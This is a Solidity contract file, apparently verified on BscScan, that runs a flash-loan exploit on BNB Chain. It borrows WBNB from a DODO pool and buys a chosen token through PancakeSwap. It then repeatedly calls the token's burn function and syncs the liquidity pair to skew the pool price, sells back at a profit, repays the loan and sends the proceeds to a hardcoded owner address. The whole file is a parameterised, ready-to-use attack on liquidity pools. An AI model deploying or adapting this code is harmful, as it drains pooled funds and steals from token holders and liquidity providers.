/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.18;

interface IERC20 {
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakePair {
    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
}

interface IDODO {
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;

    function _BASE_TOKEN_() external view returns (address);
}


contract info {
    address owner =0x0A3df4BA73452d91a56daBbCBF55Dd02102993BA ;
    
    //address router = 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
    address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address expToken;
    address expTokenLP;

    IERC20 ExpToken;
    IPancakePair ExpTokenLP;
    IPancakeRouter Router = IPancakeRouter(router);

    address dodoLoanPool = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4; // wbnb/usdt
    address dodoLoanToken = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // loan token
    IERC20 LoanToken = IERC20(dodoLoanToken);

    event callStatus(bool status);
}

contract exp is info{
    uint256 loanAmounts;
    uint256 rate;
    uint256 num; 

    function runningFFs(
        uint256 loanAmount,
        address _token,
        address _pair,
        uint256 _rate,
        uint256 _num
    ) external {
        require(msg.sender == owner);
        rate = _rate;
        num = _num;
        expToken = _token;
        expTokenLP = _pair;
        ExpToken = IERC20(expToken);
        ExpTokenLP = IPancakePair(expTokenLP);

        bytes memory data = abi.encode(dodoLoanPool, dodoLoanToken, loanAmount);
        address flashLoanBase = IDODO(dodoLoanPool)._BASE_TOKEN_();
        loanAmounts = loanAmount;
        if(flashLoanBase == dodoLoanToken) {
            IDODO(dodoLoanPool).flashLoan(loanAmount, 0, address(this), data);
        } else {
            IDODO(dodoLoanPool).flashLoan(0, loanAmount, address(this), data);
        }
    }


    function run() internal {
        ExpToken.approve(router, type(uint256).max);
        LoanToken.approve(router, type(uint256).max);
        address[] memory buyPath = new address[](2);
        buyPath[0] = address(LoanToken);
        buyPath[1] = expToken;

        address[] memory sellPath = new address[](2);
        sellPath[0] = expToken;
        sellPath[1] = address(LoanToken);

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            LoanToken.balanceOf(address(this)),
            0,
            buyPath,
            address(this),
            block.timestamp
        );

        ExpToken.balanceOf(address(this));
        uint256 _afer = ExpToken.balanceOf(expTokenLP);


        /*
        for (uint256 i=0; i<num; ++i) {
           (bool _status,) = expToken.call(abi.encodeWithSelector(0x42966c68, ExpToken.balanceOf(address(this)) - 27));
           emit callStatus(_status);
        }
        */

        /*
        while(true) {
            if (ExpToken.balanceOf(address(this)) > 27 && ExpToken.balanceOf(expTokenLP) > 2) {
                uint256 _balance = ExpToken.balanceOf(address(this));
                uint256 burnAmount = _balance * rate / 100;
                expToken.call(abi.encodeWithSelector(0x42966c68, _balance - burnAmount));
            } else {
                break;
            }
        }
        */

        for (uint256 i=0; i<num; ++i) {
            uint256 _balance = ExpToken.balanceOf(address(this));
            uint256 burnAmount = _balance * rate / 100;
            expToken.call(abi.encodeWithSelector(0x42966c68, _balance - burnAmount));
        }

        uint256 befer = ExpToken.balanceOf(expTokenLP);
        /*
        uint256 swapOut = befer - _afer;

        uint256[] memory swapAmount = Router.getAmountsOut(swapOut, sellPath);
        */

        ExpTokenLP.sync();

        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            ExpToken.balanceOf(address(this)),
            0,
            sellPath,
            address(this),
            block.timestamp
        );

        //ExpToken.transfer(address(ExpTokenLP), ExpToken.balanceOf(address(this)));
        
        //IPancakePair(expTokenLP).swap(0, swapAmount[1], address(this), new bytes(0));
    }


    // flashloan fallback func
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount,bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }

    function DSPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        _flashLoanCallBack(sender,baseAmount,quoteAmount,data);
    }


    // 处理闪贷池子回调还款
    function _flashLoanCallBack(address sender, uint256, uint256, bytes calldata data) internal {
        (address flashLoanPool, address loanToken, uint256 loanAmount) = abi.decode(data, (address, address, uint256));
        
        // 检查回调调用者是否为闪贷池子以及sender是否为本合约
        require(sender == address(this) && msg.sender == flashLoanPool, "HANDLE_FLASH_NENIED");

        run();

        //还贷
        IERC20(loanToken).transfer(flashLoanPool, loanAmount);
        LoanToken.transfer(owner, LoanToken.balanceOf(address(this)));
    }

    function withdraw(address _token, uint256 _amount) external {
        require(msg.sender == owner, "N");
        if (_token != address(0)) {
            IERC20(_token).transfer(owner, _amount);
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }
}